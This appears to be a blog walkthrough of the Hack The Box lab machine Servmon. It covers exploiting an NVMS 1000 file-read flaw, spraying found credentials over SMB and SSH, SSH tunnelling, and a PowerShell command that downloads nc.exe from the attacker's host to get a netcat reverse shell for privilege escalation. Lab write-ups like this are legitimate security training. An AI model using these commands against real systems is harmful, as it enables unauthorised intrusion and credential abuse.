---

title: "Servmon HTB"
date: 2024-08-07 20:17:41 +0800
categories: [Servmon, Medium]
tags: [Servmon, Easy-Level, Windows, HTB Walkthrough]

---



![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*Iz1Wlacvl_RhOJfLZLTWxQ.png)
Un-Important Intro:
Now now, Earlier with my first write up. I’ve written a walkthrough on the Retired machine “devel”. I have talked about how anonymous FTP login had been helpful with uploading the msfvenom crafted payload into web IIS. we have privilege escalation.
This walkthrough can be a follow-up for those willing to learn Windows privilege escalation. Feel free to check the “devel” walkthrough here.
Recon results:
Nmap scan: anonymous FTP login, open SSH logins, and there is an http web server running which is NVMS 1000 web server.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*I32Ik5tLAIiGi-4MZnGM-Q.png)
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*tMqLl69A-0Wj-Q4N0fYAbg.png)
Enumeration Begin:
//80 HTTP — web server — { Hosting NVMS — 1000 (Network Surveillance Management Software) instance) Which is found vulnerable to LFI.}
You can normally search for this vulnerability to confirm through searchsploit nvms 1000 (or) download the payload from exploit db.
From Recon.
//21 - FTP login
A cool one-liner hack I have found online to grab files from an anonymous FTP login wget -r ftp://anonymous:@10.10.10.184
If we search for NVMS vulnerabilities through searchsploit or metasploit we can find there is a LFI Vulnerability on this machine.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*Zi6VTnC3OxbDw3UdY4403A.png)
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*yOr4qCrVFfdzpKf8YvjjMQ.png)
Overall Information we got.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*ya2NkDyaSttiEZBjsO_05w.png)
Using this information. as we know users: Nathan & Nadine / Passwords with these possibilities, we can try either smb_login Metasploit or the crackmapexec.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*hL2JCiQmODwPQk8Ginw0Qw.png)
Now, there is a successful login. let’s try it out.
Unluckily smb login doesn’t work. So, I tried ssh_login with same credentials.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*hU29UJHX94Ux6xz5KPqdNg.png)
And Tada!! we got the user flag.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*l7uURxQj7oUM_slq6ZLzkg.png)
If we try to access the Administrator account. Understand this is not the end.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*nSw-_MeL8HrXdGg8T7mENw.gif)
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*w0BecdMnX8pc0TOcvMyerQ.png)
This can be really confusing, I kindly request go along with implementing the process to get a complete understanding of what’s happened.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*31n9KJ_xeXXVEyqSyPI_aQ.gif)
Background Concept SSH Tunneling:
For the base theory refer to this YouTube video. which I found helpful for understanding why ssh tunnel is used. To understand how we can use this method for our example refer to the following image.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*7pe1D-9ICdzeLk5qLNIx3A.png)
Fast forward to this,
sshpass -p “L1k3B1gBut7s@W0rk” -L 8443: localhost:8443 ssh [email protected]
Started a Python server for file transfer between linux and Windows.
Linux: python3 -m http.server -b
Windows: powershell -c (New-Object Net.WebClient).DownloadFile(‘http://10.10.14.77:8000/nc.exe','nc.e
xe’)
you can easily spot the nc.exe file in /usr/share/seclists/Web-Shells/FuzzDB if you’re using kali linux.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*txbw-Q3T9rK2Njau5stHPA.png)
There now as we got netcat listener on the victim. We just have to ring a bell to it.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*dugDx9tDlq_dvEBudb5sWQ.png)
2. There is our shell on the machine, now we need to
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*fqoIXWWYTq004U1RTv1l5Q.png)
3. run a Netcat listener on our attacking machine.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*bSa8Kp_fYGEXSyLvijlcFQ.png)
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*I0aNyKP68107LZXM9tKA9w.png)
Hell, yeah we got the root flag. The machine is Pwned!!
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*pPAq7i_wySskqc_85zB54Q.png)
Easy right??
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*cTRJNM4ehX9Gf3QK8Heijg.gif)
In-Summary:
Upon getting Nmap scan results from the servmon.
Mind Map:
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*zikNtK4rF-p8QkixZMucMg.png)
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*8jcIGXJen_E0GY5W23sQFA.png)
Appreciate If you like my approach, Follow for more.